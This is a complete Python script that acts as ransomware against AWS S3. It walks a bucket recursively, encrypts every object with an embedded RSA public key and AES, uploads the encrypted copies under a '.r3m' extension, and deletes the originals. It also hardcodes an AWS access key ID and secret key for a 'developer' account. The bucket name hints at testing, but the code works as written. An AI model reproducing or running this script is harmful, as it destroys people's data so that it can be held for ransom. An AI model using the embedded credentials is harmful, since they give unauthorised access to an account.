import boto3
from botocore.exceptions import ClientError
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import os

os.system("yum install python3-pip")
os.system("pip3 install boto3")
os.system("pip install pycryptodome")

def recursive_scan(bucket_name, prefix=''):
    s3 = boto3.client('s3')
    response = s3.list_objects_v2(Bucket=bucket_name, Prefix=prefix)

    if 'Contents' in response:
        for obj in response['Contents']:
            if not obj['Key'].endswith('/'):
                yield obj['Key']

    if 'CommonPrefixes' in response:
        for common_prefix in response['CommonPrefixes']:
            new_prefix = common_prefix['Prefix']
            yield from recursive_scan(bucket_name, new_prefix)

def encrypt_file(bucket_name, file_key, public_key):
    
    s3 = boto3.client('s3')

    # Download the file from S3
    temp_file_path = '/tmp/temp_file'
    try:
        s3.download_file(bucket_name, file_key, temp_file_path)
    except ClientError as e:
        print(f"Failed to download file '{file_key}' from S3: {str(e)}")
        return

    # Encryption code (modified from the original script)
    with open(temp_file_path, 'rb') as f:
        data = f.read()
    data = bytes(data)

    key = RSA.import_key(public_key)
    session_key = os.urandom(32)

    cipher = PKCS1_OAEP.new(key)
    encrypted_session_key = cipher.encrypt(session_key)

    cipher = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    file_name = os.path.splitext(file_key)[0]
    file_extension = '.r3m'
    encrypted_file = file_name + file_extension

    with open(encrypted_file, 'wb') as f:
        [f.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext)]

    # Upload the encrypted file to S3
    try:
        s3.upload_file(encrypted_file, bucket_name, encrypted_file)
    except ClientError as e:
        print(f"Failed to upload encrypted file '{encrypted_file}' to S3: {str(e)}")

    # Remove temporary files
    os.remove(temp_file_path)
    os.remove(encrypted_file)

def delete_file(bucket_name, file_key):
    s3 = boto3.client('s3')
    try:
        s3.delete_object(Bucket=bucket_name, Key=file_key)
        print(f"Deleted file '{file_key}' from S3 bucket '{bucket_name}'.")
    except ClientError as e:
        print(f"Failed to delete file '{file_key}' from S3: {str(e)}")


# AWS credentials and region setup - account: developer
os.environ['AWS_ACCESS_KEY_ID'] = 'AKIAQ5JG4JV24NXY2UW3'
os.environ['AWS_SECRET_ACCESS_KEY'] = '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'
os.environ['AWS_DEFAULT_REGION'] = 'us-east-1'

# S3 bucket name and prefix
bucket_name = 'test-bucket-check-check'
# If I want to scan all objects in the root of the S3 bucket, I can set the 'prefix' to empty string.
prefix = ''

# Public key
public_key_str = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyvKELZNSDFuIBUG96qTA4njyo+DseQXMB/GDrGrhPM0KwrHf53DbyS+PEroJwRa4KZRAN98MclG20z9Y0w+y9CZrjirKuqfy6SEeIMZBEFPVGtxfMaUY5DtCbqlqOZ5f19l/geb2NFEXC6ZHdNIODkswGIp+ObVNCZajVPevyS8SDmZhbr1i73aD7V9jr8Y9MwiWCM05yv9RnB0TCfsD/RYwgWzVxTOoq3VsnLnTlPzwa4f+BNwBtG3CSXO45WNIBPeJf1tkgQo6/2mqWKKPLWhb3re+0+O2+O+9iIMWXVkIWFWaJ6BQLjWK/pADK7xDk453XOAbW6vLiSvk24izVwIDAQAB'
public_key = base64.b64decode(public_key_str)

# Recursively scan the bucket and encrypt files
for file_key in recursive_scan(bucket_name, prefix):
    encrypt_file(bucket_name, file_key, public_key)
    delete_file(bucket_name, file_key)
